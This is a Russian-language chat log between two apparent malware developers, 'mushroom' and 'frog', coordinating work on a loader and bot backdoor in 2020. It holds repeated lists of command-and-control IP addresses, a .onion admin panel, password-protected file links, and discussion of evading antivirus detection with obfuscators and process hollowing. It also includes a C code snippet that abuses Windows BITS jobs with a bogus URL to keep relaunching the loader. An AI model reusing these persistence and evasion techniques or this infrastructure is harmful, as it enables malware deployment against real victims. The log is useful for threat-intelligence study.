Привет пришли Бузе генератор id для бота.

2020-07-30T13:23:10 frog -> mushroom
Хорошо. Сейчас сделаю

2020-07-30T13:24:29 mushroom -> frog
Через qaz.im сделай.

2020-07-31T09:26:00 mushroom -> frog
CMake проект есть, чтобы компилировать MinGW можно было лоадер и бот?

2020-07-31T09:26:20 frog -> mushroom
Нет

2020-07-31T09:26:52 mushroom -> frog
Сделай, пока тестировать будут твой комплект.

2020-07-31T09:27:48 mushroom -> frog
Clang ещё нужен, но он в Visual Studio уже интегрирован. И на работу будешь выдавать сразу 3 версии MSVC, Clang и MinGW.

2020-07-31T15:05:28 frog -> mushroom
Можно какой-нибудь пример Cmake-проекта посмотреть?

2020-07-31T15:57:44 mushroom -> frog
Сейчас пришлю.

2020-07-31T16:00:35 mushroom -> frog
Download: https://qaz.im/load/QiGbaG/sSA8NQ   
Delete: https://qaz.im/index.php?a=delete&q=562805300
Пароль: $$|Kg`COgZG=$(NR3

2020-07-31T16:01:42 mushroom -> frog
Это пример проекта для бота. Измени под свои файлы.

2020-08-04T07:54:10 mushroom -> frog
Привет писал тебе Бентли?

2020-08-04T07:54:11 mushroom -> frog
<bentley> на 7 отработало полностью на 10 и 2019 не работало вообще. И логи не появлялись 
[10:53:47] <bentley> При запуск версии с логами

2020-08-04T07:54:19 mushroom -> frog
Это твой комплект.

2020-08-04T08:02:11 mushroom -> frog
Разберись. Меня в курсе держи.

2020-08-05T08:28:03 mushroom -> frog
Привет. Ну как работа на Win 10 и Server 2019?

2020-08-05T08:34:48 frog -> mushroom
Привет! Разбираюсь, ищу ошибки. На Windows 10 заработало.

2020-08-05T08:50:09 mushroom -> frog
OK.

2020-08-05T12:29:38 frog -> mushroom
Отправил Bentley комплект на тестирование. Последние версии обоих проектов загрузил на gitlab.

2020-08-05T12:30:12 mushroom -> frog
OK.

2020-08-07T10:21:45 mushroom -> frog
Бентли сказал что на Win Server 2019 детект сразу после перезагрузки происходит с твоим комплектом. Допили чтобы не было его.

2020-08-07T10:28:20 frog -> mushroom
Привет. У меня машины с Windows Server 2019 нет. По удалёнке к этой ОС как-нибудь можно подключиться?

2020-08-07T10:59:56 mushroom -> frog
У Бентли спроси.

2020-08-07T11:00:34 mushroom -> frog
Он тебе даст доступ.

2020-08-10T12:19:34 frog -> mushroom
Привет! Какие сейчас ip-адреса?

2020-08-10T12:24:57 mushroom -> frog
Пока не знаю.

2020-08-11T08:41:16 mushroom -> frog
Если еще нужно вот адреса:

лоадеры
31.214.240.203 
78.108.216.13
195.123.240.6
194.5.249.163
80.82.68.132
62.108.35.215


бот
80.82.68.32
194.5.249.164
195.123.237.241 
37.220.6.122 
45.148.120.142
62.109.13.184

2020-08-12T09:44:52 mushroom -> frog
Привет. Ну как с Win Server 2019?

2020-08-12T09:51:10 frog -> mushroom
Привет! Разбираюсь пока. Попросил Bentley ещё на других машинах протестировать. На той, которую он предоставил, детекты пропали.

2020-08-12T09:51:44 mushroom -> frog
То есть ты починил и отдал ему на тесты?

2020-08-12T09:56:40 frog -> mushroom
Да там особо ничего не чинил. Разбирался, в чём причина, а они пропали сами по себе. Кроме ip-адресов, по сути, ничего не менял. Поэтому попросил его протестировать на других машинах.

2020-08-12T09:57:34 mushroom -> frog
Когда отдавал на тесты? Ничего он не писал ещё?

2020-08-12T09:57:54 frog -> mushroom
Вчера отдал. Пока не писал.

2020-08-12T09:58:36 mushroom -> frog
Понял.

2020-08-13T09:35:42 mushroom -> frog
Привет. Прошёл тесты твой комплект. Сделал чтобы можно было 3 компиляторами собирать?

2020-08-13T09:37:34 frog -> mushroom
Привет. Не сделал. Начал тогда делать на mingw, много ошибок было. Сходу не получилось.

2020-08-13T09:38:03 mushroom -> frog
Ну вот пока нечего делать больше, сделай.

2020-08-13T09:38:49 mushroom -> frog
Clang в Visual Studio уже встроен, нужно только MinGW.

2020-08-13T09:39:43 mushroom -> frog
Пока по поводу комплекта ждём Бузу. Он скажет кому его в работу отдавать.

2020-08-13T09:40:32 mushroom -> frog
В отдельной ветке все эксперименты теперь веди, чтобы чистую рабочую версию не портить.

2020-08-13T09:42:10 frog -> mushroom
Хорошо

2020-08-14T11:54:21 mushroom -> frog
Привет. Сделай на dyncheck тест на динамику своего последнего загрузчика (который Бентли тестировал) и пришли мне ссылку.

2020-08-14T13:55:06 frog -> mushroom
Привет. Это 64-разрядная версия:
https://dyncheck.com/scan/id/d5c95e14a38de0b433faf026dfb29ad6

2020-08-14T13:59:44 mushroom -> frog
OK. А что их больше стало чем было раньше?

2020-08-14T14:06:40 mushroom -> frog
32 битный тоже сделай.

2020-08-14T14:15:54 frog -> mushroom
Да, с какого-то времени они заметили регистрацию в реестре.

2020-08-14T14:16:18 mushroom -> frog
Почисти.

2020-08-14T14:22:14 frog -> mushroom
Это тест для 32-разрядного:
https://dyncheck.com/scan/id/b726d93392c6a2b6cc301ef71f7f1a5e

2020-08-19T11:18:21 mushroom -> frog
Привет почистил динамические детекты у загрузчика? Если почистил пришли мне ссылки на dyncheck.

2020-08-19T11:32:31 frog -> mushroom
Привет. Ещё не почистил

2020-08-20T13:14:27 mushroom -> frog
Привет. Ну как там с детектами?

2020-08-20T13:20:58 frog -> mushroom
Привет. Ну как там с детектами?

2020-08-20T14:32:41 frog -> mushroom
Привет.
Какие сейчас IP-адреса?

2020-08-20T14:34:45 mushroom -> frog
лоадеры
82.146.37.128
107.155.137.18
195.123.240.6
86.104.194.29 
195.123.241.68
195.123.241.175


бот
91.200.100.85 
95.171.15.71
195.123.237.241 
37.220.6.122 
51.89.204.242
195.123.240.52

2020-08-20T14:35:06 frog -> mushroom
спасибо

2020-08-21T09:06:01 mushroom -> frog
Привет. Посмотрел сейчас то что в GitLab

2020-08-21T09:06:16 mushroom -> frog
Информация о системе нормально работает.

2020-08-21T09:06:24 mushroom -> frog
Hollowing не работает.

2020-08-21T09:06:38 mushroom -> frog
Не сюда написал.

2020-08-21T09:07:01 mushroom -> frog
Напиши мне когда разберёшся с детектами.

2020-08-21T09:11:15 frog -> mushroom
Привет. Не знаешь, детект IDP.Generic отчего возникает?

2020-08-21T09:13:25 frog -> mushroom
Он то возникает, то нет с одним и тем же файлом.

2020-08-21T09:16:13 mushroom -> frog
Не не знаю. Это у какого антивируса?

2020-08-21T09:17:30 frog -> mushroom
AVG Internet Security и Avast. В 64-разрядной версии детектируют

2020-08-21T09:21:53 mushroom -> frog
Это статический детект?

2020-08-21T09:38:12 frog -> mushroom
Динамический

2020-08-21T09:40:01 mushroom -> frog
А ты пробовал отключать кусок программы и проверять на детекты, пока он не пропадёт?

2020-08-21T09:41:11 mushroom -> frog
Ещё смотри что там на картинках детектов, там несколько детектов я знаю всегда из-за файервола, они не считаются.

2020-08-21T09:41:11 frog -> mushroom
Конечно. Просто он то возникает, то нет. Вот в чём проблема.

2020-08-21T09:47:13 mushroom -> frog
Без них сколько детектов?

2020-08-21T09:47:36 frog -> mushroom
Без них сколько детектов?

2020-08-21T09:53:27 mushroom -> frog
Без них сколько детектов?

2020-08-21T09:53:51 frog -> mushroom
2 или 3

2020-08-21T09:54:09 mushroom -> frog
Файерволовские?

2020-08-21T09:54:28 mushroom -> frog
Пришли ссылки.

2020-08-21T09:55:28 frog -> mushroom
Вчера проверял:
https://dyncheck.com/scan/id/158c99f5d376565a9f8ae2bcb2be65ef

2020-08-21T09:56:50 frog -> mushroom
Avast установил, попробую выяснить в чём дело

2020-08-21T10:04:08 mushroom -> frog
Нормально. Comodo всегда детекты даёт там, он какой то там непонятный, другие это файервол, они не считаются.

2020-08-21T10:04:49 mushroom -> frog
В общем если не получиться разобраться отдавай Бентли эту версию на тесты.

2020-08-24T07:24:38 frog -> mushroom
Привет. Разбирался с динамическими детектами.
Получилось так. 
64-разрядная версия: 
https://dyncheck.com/scan/id/2f83b0fde38d24eb44e0ad4dbdbd186c
32-разрядная версия:
https://dyncheck.com/scan/id/d7dd896d903a61155799dd9ddc116ab1

2020-08-24T07:29:40 frog -> mushroom
BitDefender Total Security почему-то показывает детект даже на exe-файл, который ничего не делает (кроме ExitProcess сразу при запуске).
Dr Web не знаю что хочет. Пробовал ставить его на виртуальную машину, он ничего не спрашивал при запуске. Но версия была какая-то другая.

2020-08-24T07:30:47 frog -> mushroom
Malwarebytes Anti-Malware иногда спрашивает разрешения выйти в интернет.

2020-08-24T07:33:15 frog -> mushroom
AVG Internet Security и Avast Internet Security не нравилась регистрация в реестре (IDP.Generic, про который спрашивал). Это исправил. Эти антивирусы, оказываются, имею один и тот же движок

2020-08-24T07:35:47 frog -> mushroom
Если бы был доступ к машине с таким же антивирусом DrWeb, можно было бы попробовать разобраться.

2020-08-24T07:43:10 mushroom -> frog
Привет. Хорошо получилось. Отдавай эти версии Бентли на тесты.

2020-08-24T07:45:12 frog -> mushroom
Хорошо. Попросил Бентли пустить на машину с Windows Server 2019. Проверю на всякий случай, чтобы как тогда не было, а потом отдам на тесты.
Какие сейчас IP-адреса?

2020-08-24T07:47:34 mushroom -> frog
лоадеры
82.146.37.128
85.143.221.85
45.138.158.41
37.220.6.126
195.123.241.68
195.123.241.175


бот
91.200.100.85 
95.171.15.71
195.123.237.241 
37.220.6.122 
51.89.204.242
195.123.240.52

2020-08-28T10:10:08 frog -> mushroom
Привет. Отправил Bentley на тестирование следующий комплект

2020-08-28T10:24:01 mushroom -> frog
OK.

2020-08-31T12:34:26 mushroom -> frog
Привет твоя группа теперь для боевого бота это 7.

2020-08-31T12:34:35 mushroom -> frog
Внеси изменения.

2020-08-31T12:34:57 mushroom -> frog
seven это твоя тестовая группа на боевом сервере.

2020-08-31T12:35:22 frog -> mushroom
Привет. Хорошо

2020-08-31T12:35:57 mushroom -> frog
7 это группа уже для работы. Будешь её использовать в сборках, которые будешь отдавать в работу уже.

2020-08-31T12:36:41 frog -> mushroom
Т.е. вместо "seven" использовать "7"?

2020-08-31T12:36:58 mushroom -> frog
Для рабочих версий.

2020-08-31T12:37:04 frog -> mushroom
 Как прошло последнее тестирование?

2020-08-31T12:37:19 mushroom -> frog
А для тестирования seven.

2020-08-31T12:37:27 mushroom -> frog
Не спрашивал.

2020-08-31T12:37:43 mushroom -> frog
У тебя же есть Бентли, узнай.

2020-08-31T12:38:35 mushroom -> frog
Какой у тебя логин на боевом сервере?

2020-08-31T12:38:59 frog -> mushroom
b16

2020-08-31T12:40:13 mushroom -> frog
Проверь доступ к группе 7.

2020-08-31T12:41:58 frog -> mushroom
Появилась такая группа

2020-08-31T12:42:43 mushroom -> frog
Проверь как работает, загрузи файлы туда и протестируй.

2020-08-31T12:45:18 mushroom -> frog
И бот пометь как тестовый, чтобы не путаться.

2020-08-31T12:48:05 mushroom -> frog
лоадеры
82.146.37.128
85.143.221.85
45.138.158.41
37.220.6.126
164.132.76.76
195.123.241.175


бот
91.200.100.85 
212.22.70.4
194.156.98.46
37.220.6.122 
51.89.204.242
195.123.240.52

2020-08-31T12:48:50 mushroom -> frog
Проверишь когда группу 7. Если всё нормально отдавай эти сборки боевые с группой 7 Бентли.

2020-09-01T13:15:15 mushroom -> frog
Привет.

2020-09-01T13:15:41 mushroom -> frog
Твой бэкдор отдаём в работу Target.

2020-09-01T13:16:16 frog -> mushroom
Привет

2020-09-01T13:16:20 mushroom -> frog
Ты для группы 7 сделал боевую сборку?

2020-09-01T13:16:37 frog -> mushroom
Нет, пока не сделал

2020-09-01T13:17:09 mushroom -> frog
Сделай, отдай её Бентли, он проверит, закрептует её и отдаст Target в работу.

2020-09-01T13:17:27 frog -> mushroom
Хорошо

2020-09-01T13:42:23 mushroom -> frog
И ещё забыл сказать. Теперь каждая новая сборка для группы 7 увеличивай версию бота и загрузчика, и сборки делай тремя компиляторами MinGW, Clang, MSVC у всех трёх одна версия. Потом на следующий день делаешь новую сборку, у всех трёх увеличиваешь версию. Например сегодня у тебя 1.5 у всех, завтра 1.6

2020-09-01T13:44:22 mushroom -> frog
И обнови на Гитлаб проекты свои до последних стабильных версий которые делаешь, если ещё не сделал этого.

2020-09-01T13:45:51 frog -> mushroom
Там сейчас стабильные версии. То, что сейчас отправлено на тестирование оно же на gitlab.

2020-09-01T13:46:05 mushroom -> frog
Просто уточнил.

2020-09-01T13:46:45 frog -> mushroom
Версию так и увеличиваю. Хотел подождать результатов тестирования. Bently сказал, что ещё тестирует.

2020-09-01T13:47:28 mushroom -> frog
Для группы 7 каждый раз увеличивай как отдаёшь.

2020-09-01T13:47:45 mushroom -> frog
Для группы seven как хочешь, она тестовая.

2020-09-01T13:49:48 frog -> mushroom
Насчёт группы всё понял.
Clang, MSVC пробовал компилировать, всё нормально. MinGW ещё не успел сделать, в последний раз пробовал скомпилировать, куча ошибок вывалилась, ещё не успел исправить. Да и потом ещё затеял написать обфускатор системных вызовов. Хотел отладить его и скомпилировать в MinGW.

2020-09-01T13:50:24 mushroom -> frog
Значит пока MSVC и Clang делай.

2020-09-01T13:51:30 mushroom -> frog
У нас кстати есть Clang обфускатор, который программу очень сильно обфусцирует.

2020-09-01T13:51:48 mushroom -> frog
В redmine про это написано.

2020-09-01T13:54:21 frog -> mushroom
Хорошо, посмотрю.
Хотел ещё посоветоваться по такому поводу. Можно ли закрепление в системе, загрузку с сервера делать тоже в режиме маскировки. Т.е. чтобы не сам dl7.exe это делал, а некий зашифрованный исполняемый файл, который распаковывается, например, из файла ресурсов и запускается в режиме маскировки?

2020-09-01T13:55:15 frog -> mushroom
Или PE-загрузчик, который делает то же, но в контексте собственного процесса?

2020-09-01T13:55:59 mushroom -> frog
Это делает крипт.

2020-09-01T13:56:43 mushroom -> frog
Это программа в которую твой загрузчик запихивают, она потом его достаёт и запускает как Hollowing например.

2020-09-01T13:56:53 mushroom -> frog
Это делает другой человек.

2020-09-01T13:57:10 mushroom -> frog
Бентли ему твой загрузчик отдаёт для этого.

2020-09-01T13:57:48 frog -> mushroom
Ааа... Т.е. борьба со статическими детектами делается просто для подстраховки?

2020-09-01T13:57:57 mushroom -> frog
Да.

2020-09-01T13:59:09 frog -> mushroom
Теперь всё стало яснее. Спасибо!

2020-09-01T14:02:05 mushroom -> frog
Бузу добавь в свои проекты как Master. Он на GitLab binman.

2020-09-01T14:02:29 frog -> mushroom
Хорошо

2020-09-01T14:02:51 frog -> mushroom
А логин какой у него?

2020-09-01T14:03:03 frog -> mushroom
А всё, понял

2020-09-01T14:03:03 mushroom -> frog
binman

2020-09-01T14:07:44 frog -> mushroom
Добавил

2020-09-01T14:08:00 mushroom -> frog
OK.

2020-09-01T15:50:13 mushroom -> frog
А ты Бентли отдавал на тесты с группой 7 комплект?

2020-09-01T15:50:23 mushroom -> frog
Или seven?

2020-09-01T15:50:38 frog -> mushroom
seven ещё тестируется

2020-09-01T15:51:53 frog -> mushroom
Устранял динамические детекты, потом ещё раз отдал на тестирование

2020-09-01T15:52:34 mushroom -> frog
Сделай сразу 7. Он её протестирует.

2020-09-01T15:53:54 mushroom -> frog
Он её проверит и если всё норм отдаст в работу.

2020-09-01T15:55:30 mushroom -> frog
Та что не жди тестов для seven. Сделай такую же для группы 7 и отдай Бентли.

2020-09-01T15:55:39 frog -> mushroom
Хорошо

2020-09-02T07:44:22 frog -> mushroom
Привет. Отправил Bentley на тестирование комплект с группой "7".

2020-09-02T07:50:39 mushroom -> frog
Хорошо.

2020-09-03T08:48:45 mushroom -> frog
Ну как тесты группы 7?

2020-09-03T08:50:20 frog -> mushroom
Привет. Всё прошло нормально

2020-09-03T08:51:03 mushroom -> frog
Тогда теперь каждый день надо делать новую сборку с увеличением версии и отдавать Бентли.

2020-09-03T08:51:31 mushroom -> frog
Всеми компиляторами, которыми на данный момент можешь сделать.

2020-09-03T08:51:57 frog -> mushroom
Понятно

2020-09-03T08:52:23 mushroom -> frog
Ну и пока делать нечего доделай MinGW.

2020-09-03T08:52:58 frog -> mushroom
Обфускатор же ещё пишу. Есть что делать.

2020-09-03T08:55:21 frog -> mushroom
А в обфускаторе строк можно как-нибудь подавить предупреждение "недопустимый неполный тип", не знаешь?

2020-09-03T08:55:49 mushroom -> frog
Я думаю нельзя.

2020-09-03T08:56:26 mushroom -> frog
Так как во время компиляции только строки по факту превращаются в шифрованные массивы.

2020-09-04T08:11:14 mushroom -> frog
Привет. Адреса.
лоадеры
82.146.37.128
85.143.221.85
45.138.158.41
37.220.6.126
164.132.76.76
195.123.241.175


бот
93.189.46.41 
212.22.70.4
194.156.98.46
81.177.139.38
54.37.237.253
195.123.240.52

2020-09-04T08:11:35 mushroom -> frog
Или тебе Green присылает их?

2020-09-04T08:32:39 frog -> mushroom
Привет. Никто не присылает. Детект один статический появился. Разберусь, потом вышлю Бентли комплект

2020-09-07T07:10:58 mushroom -> frog
лоадеры
82.146.37.128
85.143.221.85
195.123.241.194
37.220.6.126
164.132.76.76
195.123.241.175


бот
93.189.46.41 
212.22.70.4
194.156.98.46
81.177.139.38
54.37.237.253
185.164.32.107

2020-09-08T13:57:01 frog -> mushroom
Привет. Bentley сказал админка поменялась, просит сделать новую сборку. Не пойму, что нужно поменять в коде?

2020-09-08T13:57:19 mushroom -> frog
В коде ничего.

2020-09-08T13:57:38 mushroom -> frog
Адреса те же работают.

2020-09-08T13:58:01 mushroom -> frog
https://scrytnuuszglaugg.onion:4247/login

2020-09-08T13:58:15 mushroom -> frog
Это адрес для браузера.

2020-09-08T13:59:31 mushroom -> frog
Если логин твой не подходит, напиши Бузе он тебе пароль даст.

2020-09-08T14:00:37 frog -> mushroom
IP-адреса сегодня те же?

2020-09-08T14:02:22 mushroom -> frog
Да.

2020-09-09T13:19:01 mushroom -> frog
Привет. Адреса:
лоадеры
82.146.37.128
85.143.221.85
195.123.241.194
37.220.6.126
164.132.76.76
195.123.241.175


бот
93.189.46.41 
212.22.70.4
194.156.98.46
93.189.40.214
54.37.237.253
185.164.32.107

2020-09-09T13:19:12 mushroom -> frog
Делаешь каждый день сборку новую?

2020-09-09T13:20:32 frog -> mushroom
Привет. Вчера делал. Сегодня ещё нет. Bentley вчерашнюю ещё не проверил.

2020-09-09T13:21:27 mushroom -> frog
А что детекты были или изменял что?

2020-09-09T13:22:20 frog -> mushroom
Да, изменял. Были детекты.

2020-09-09T13:22:38 mushroom -> frog
Если просто пересобираешь уже проверенную версию, не нужно ждать пока он проверит. Просто собрал и ему отослал, он их накапливает для работы.

2020-09-09T13:23:03 frog -> mushroom
Хорошо.

2020-09-09T13:26:54 mushroom -> frog
А пароль тебе сделали для админки?

2020-09-09T13:27:29 mushroom -> frog
https://scrytnuuszglaugg.onion:4247/login можешь зайти сюда?

2020-09-09T13:28:24 frog -> mushroom
Писал вчера Бузе, просил дать новый пароль.
Зайти не получается, старый логин и пароль не подходит.

2020-09-09T13:28:57 mushroom -> frog
Буза судя по всему не заметил или сообщение не дошло.

2020-09-09T14:53:25 mushroom -> frog
Какой у тебя логин?

2020-09-09T14:53:35 frog -> mushroom
b16

2020-09-09T14:56:48 mushroom -> frog
Дошло сообщение?

2020-09-09T14:57:00 frog -> mushroom
Да, сейчас проверяю

2020-09-09T15:01:35 frog -> mushroom
Зашёл в админку, всё нормально. Ты логин спросил. Ещё что-то писал?

2020-09-09T15:01:52 mushroom -> frog
Нет.

2020-09-10T15:44:46 frog -> mushroom
Привет. Мне отправлять сегодня комплект? Просто есть что исправлять

2020-09-10T15:57:35 mushroom -> frog
Привет. Каждый день отправляй если работает.

2020-09-14T08:41:07 frog -> mushroom
Привет. Какие сегодня ip-адреса?

2020-09-14T08:43:43 mushroom -> frog
Привет. Такие:
лоадеры
82.146.37.128
85.143.221.85
195.123.241.194
37.220.6.126
164.132.76.76
164.68.107.165


бот
93.189.46.41 
212.22.70.4
194.156.98.46
93.189.40.214
54.37.237.253
185.164.32.107

2020-09-15T12:07:59 frog -> mushroom
Привет. IP-адреса сегодня изменились?

2020-09-15T12:27:06 mushroom -> frog
Привет. Нет.

2020-09-16T07:52:17 mushroom -> frog
Привет.
лоадеры
82.146.37.128
85.143.221.85
195.123.241.194
37.220.6.126
164.132.76.76
164.68.107.165


бот
51.89.177.8 
212.22.70.4
194.156.98.46
93.189.40.214
54.37.237.253
185.164.32.107

2020-09-16T12:11:16 frog -> mushroom
Привет.
Как вызвать функцию addBitsJob из модуля anchorage для закрепления в системе? Есть пример?

2020-09-16T12:16:36 mushroom -> frog
Пример:
WCHAR tmpFileName[LCG_RANDOM_IN_RANGE(MAX_PATH + 1, MAX_PATH + 41)];
    kernel32.getTempPathW(_countof(tmpFileName), tmpFileName);
    kernel32.getTempFileNameW(tmpFileName, (PCWSTR)L'\0', 0, tmpFileName);

    WCHAR filename[LCG_RANDOM_IN_RANGE(MAX_PATH + 1, MAX_PATH + 41)];
    if (kernel32.getModuleFileNameW(NULL, filename, _countof(filename)))
    {
        WCHAR remoteName[LCG_RANDOM_IN_RANGE(30, 30 * 2)];
        lstrcpyW(remoteName, _WCS(L"https://google.com/update.exe"));
        WCHAR description[LCG_RANDOM_IN_RANGE(19, 19 * 2)];
        lstrcpyW(description, _WCS(L"Update maintenance"));

        if (!addBitsJob(remoteName, tmpFileName, description, filename/*, NULL*/))
        {
            debug_printf(TEXT("Can't add bits copy job\n"));
        }

2020-09-16T12:17:33 mushroom -> frog
Смысл в том чтобы дать заранее левый адрес. Тогда эта система перейдёт в состояние ошибки и будет вызывать постоянно нужную нам программу (загрузчик).

2020-09-16T12:18:15 mushroom -> frog
Загрузчик в этом случае должен тогда возвращать 1. Тогда система будет вызывать его всегда, пока он не вернёт 0.

2020-09-16T12:22:22 frog -> mushroom
Спасибо. Буду разбираться.

2020-09-17T14:24:16 frog -> mushroom
Привет! IP-адреса сегодня изменились?

2020-09-17T14:56:17 mushroom -> frog
Вот:
лоадеры
82.146.37.128
85.143.221.85
45.148.10.190
86.104.194.77
164.132.76.76
164.68.107.165


бот
51.89.177.8 
212.22.70.4
194.156.98.46
93.189.40.214
54.37.237.253
185.164.32.107

2020-09-17T14:56:23 mushroom -> frog
Немного изменились.

2020-09-18T11:22:03 mushroom -> frog
Привет у тебя на данный момент как с детектами?

2020-09-18T12:09:29 frog -> mushroom
Привет. Бентли сегодня тестировал. Появился детект. Сейчас разбираюсь.

2020-09-18T12:10:14 mushroom -> frog
Как называется?

2020-09-18T12:11:08 frog -> mushroom
Trojan:Script/Wacatac.B!ml
Behavior:Win32/Persistence.GI!ml

2020-09-18T12:11:39 mushroom -> frog
Behavior:Win32/Persistence.GI!ml это наверное из-за того что в реестр пишешь.

2020-09-18T12:13:39 frog -> mushroom
Может убрать запись в реестр? Оставить создание ярлыка и задания BITS?

2020-09-18T12:15:05 mushroom -> frog
Попробуй по одному попробовать, что уберёт детект то и оставляй.

2020-09-18T12:24:22 mushroom -> frog
Что у тебя из моего кода в загрузчике есть? У меня тоже Wacatac.

2020-09-18T12:36:11 frog -> mushroom
Модуль crypter.
emercoinResolveDns

2020-09-18T12:55:56 frog -> mushroom
Проверка  локализации.
Закрепление в системе. 
Удаление хуков.
Но все эти модули обфусцирую по-своему и них много менял. libraryproxy переписал по-своему.

2020-09-18T13:49:00 mushroom -> frog
Адреса:
лоадеры
194.5.249.156
85.143.221.85
45.148.10.190
86.104.194.77
164.132.76.76
164.68.107.165


бот
51.89.177.8 
212.22.70.4
194.156.98.46
93.189.40.214
54.37.237.253
185.164.32.107

2020-09-18T15:08:46 frog -> mushroom
Уточнить хотел. В системе же закрепляется exe-файл (загрузчик имею ввиду), который запускается первым или тот, что загружается с сервера и запускается вторым тоже нужно закреплять в системе?

2020-09-18T15:10:04 mushroom -> frog
Закрепляется один, если на сервере окажется другая версия, он скачивается и запускается.

2020-09-18T15:10:36 mushroom -> frog
То есть если скачался новый, то старый удаляется, новый уже сам закрепиться.

2020-09-18T15:16:02 frog -> mushroom
А как правильно записывать информацию об антивируснике? Делал так: 
&av=name
и так:
&av[1]=name1&av[2]=name2
Но что-то ни первый способ, ни второй не показывает потом информацию об антивируснике при нажатии на "more bot info". Хотя в самой команде вся информация есть.

2020-09-18T15:19:48 mushroom -> frog
&av[0]=name1&av[1]=name2&avp[0]=ver1&avp[1]=ver2

2020-09-18T15:19:56 mushroom -> frog
У меня так.

2020-09-18T15:21:38 frog -> mushroom
Спасибо
Буза ещё сказал с митигациями разобраться и запрет на старт потоков сделать. Можно какой-нибудь пример посмотреть или почитать об этом где можно?

2020-09-18T15:23:58 mushroom -> frog
Я сам ещё не разбирался, но думаю это типа этого https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-setprocessmitigationpolicy

2020-09-18T15:24:49 frog -> mushroom
Понятно, нужно разбираться

2020-09-18T15:27:36 frog -> mushroom
Задания BITS какой утилитой можно просматривать?

2020-09-18T16:18:18 mushroom -> frog
bitsadmin /list

2020-09-18T16:18:28 mushroom -> frog
bitsadmin /list /verbose

2020-09-18T16:18:34 mushroom -> frog
bitsadmin /reset

2020-09-18T16:18:51 mushroom -> frog
Посмотреть, подробнее, удалить задания.

2020-09-21T17:05:45 mushroom -> frog
Привет. Просьба теперь каждый день писать мне что там по детектам у загрузчика. А я буду передавать Стерну.

2020-09-21T17:07:53 frog -> mushroom
Привет. Просьба теперь каждый день писать мне что там по детектам у загрузчика. А я буду передавать Стерну.

2020-09-22T09:43:04 mushroom -> frog
Привет, изменения в командах, у бота появилась команда 18, она означает закрепиться в системе. Получается закрепление нужно убрать из загрузчика если ты его сделал и перенести в бот. Получается так загрузчик передаёт путь к своему файлу в бот. И бот если получит команду 18 использует этот путь для закрепления в системе загрузчика. Бот по прежнему нельзя сохранять на диск.

2020-09-22T11:47:35 mushroom -> frog
Привет, изменения в командах, у бота появилась команда 18, она означает закрепиться в системе. Получается закрепление нужно убрать из загрузчика если ты его сделал и перенести в бот. Получается так загрузчик передаёт путь к своему файлу в бот. И бот если получит команду 18 использует этот путь для закрепления в системе загрузчика. Бот по прежнему нельзя сохранять на диск.

2020-09-22T11:51:28 frog -> mushroom
Привет. Хорошо.

2020-09-22T12:26:00 frog -> mushroom
Удалось выяснить причину детекта Wacatac? Мне показалось, что это из-за обфускатора строк. Когда убирал или укорачивал обфусцированные строки, он пропадал.

2020-09-22T12:27:37 mushroom -> frog
А просто если программу сделать с обфускатором строк и кучу строк там написать будет Wacatac?

2020-09-22T12:27:52 mushroom -> frog
У тебя Wacatac для 32 битной программы только?

2020-09-22T12:28:26 mushroom -> frog
Если только для 32 битной, можешь забить на него пока 32 битный загрузчик не используется.

2020-09-22T12:28:45 mushroom -> frog
Нужен 64 битный только чистый.

2020-09-22T12:30:05 mushroom -> frog
У меня Wacatac и DefenseIvasion и это где то в процессе создание ProcessHollowing, так как я эту функцию закомментировал и не было детектов больше, раскомментировал появились.

2020-09-22T12:30:23 mushroom -> frog
И у меня только это для 64 битного загрузчика.

2020-09-22T12:35:56 frog -> mushroom
У меня он в 32-разрядной версии. Просто программу с обфускатором делать не пробовал, но один раз попробовал сделать длинную строку в начале функции main, а все остальные модули закомментировал. Так этот детект не пропал, пока не удалил эту строку, хотя там около 80% кода уже не было. Ещё заметил, что он пропадал, когда закомментировал или укоротил длинные строки со списком emercoin-адресов и функцию с большим кол-вом названий dll-библиотек.

2020-09-22T12:40:50 frog -> mushroom
Обфускатор вставляет в код последовательность вызовов MOV, если смотреть в окне "Дизассемблированный код".
Может антивируснику это и не нравится, хотя ничего криминального в этом вроде бы нет. Это же просто локальные переменные, по сути.

2020-09-22T12:42:58 frog -> mushroom
Похожая ситуация была с детектом Fugrafa антивируса BullGuard. Обфускатор если закомментировать, он пропадает.

2020-09-22T12:43:45 mushroom -> frog
А что за обфускатор?

2020-09-22T12:44:28 frog -> mushroom
Тот же самый, который ты мне давал: strobfuscator.h

2020-09-22T12:47:08 mushroom -> frog
Вот этот попробуй:
Download: https://qaz.im/load/zY7BSQ/fEdaH8   
Delete: https://qaz.im/index.php?a=delete&q=2095202804
Пароль: :PV1[A<8#hC3YLWZX

2020-09-22T12:47:46 mushroom -> frog
Первый символ в пароле это ":"

2020-09-22T12:48:08 mushroom -> frog
":PV1[A<8#hC3YLWZX"

2020-09-22T12:49:00 mushroom -> frog
В начале файла пишешь:
#ifdef OBFUSCATED_STRINGS
#include "MetaString4.h"
using namespace andrivet::ADVobfuscator;
#endif

2020-09-22T12:49:11 mushroom -> frog
_STR так же там работает

2020-09-22T12:49:23 mushroom -> frog
Там только нету обфускации юникод строк.

2020-09-22T12:52:04 frog -> mushroom
Спасибо

2020-09-22T12:53:18 mushroom -> frog
Потом мне скажи результат. Если это так, я тогда stdobfuscator доработаю (вставлю туда методы обфускации дополнительные из этого обфускатора, а то там сейчас один всего.

2020-09-22T13:03:34 mushroom -> frog
А холловинг делаешь как я код присылал?

2020-09-22T13:04:11 mushroom -> frog
Я сейчас у себя его изменил и у меня не появляются детекты Wacatc и DefenseIvasion.

2020-09-22T13:06:09 frog -> mushroom
Он немного другой у меня. Технически он тот же, но реализация другая. За основу брал тот, который мне давал Буза и переделывал его под 64-разрядную версию.

2020-09-24T11:34:41 mushroom -> frog
Привет.

2020-09-24T11:34:43 mushroom -> frog
лоадеры
195.123.237.91
45.143.136.209
91.235.129.64
92.242.40.137
91.235.129.64
92.242.40.137 

бот
88.150.197.173 
185.113.140.186
194.87.232.53 
104.149.170.182 
185.17.123.63
45.138.158.35

2020-09-24T11:35:00 mushroom -> frog
На x64 загрузчике детекты есть?

2020-09-24T13:14:03 frog -> mushroom
Привет. Закрепление в системе внутри бота ещё делаю.

2020-09-24T13:14:38 frog -> mushroom
На 64-разрядной версии не было детектов

2020-09-24T13:27:16 frog -> mushroom
Привет. Закрепление в системе внутри бота ещё делаю.

2020-09-24T13:27:16 frog -> mushroom
На 64-разрядной версии не было детектов

2020-09-24T13:28:18 mushroom -> frog
x86 не нужна. Сдавай стабильную версию x64 Бентли.

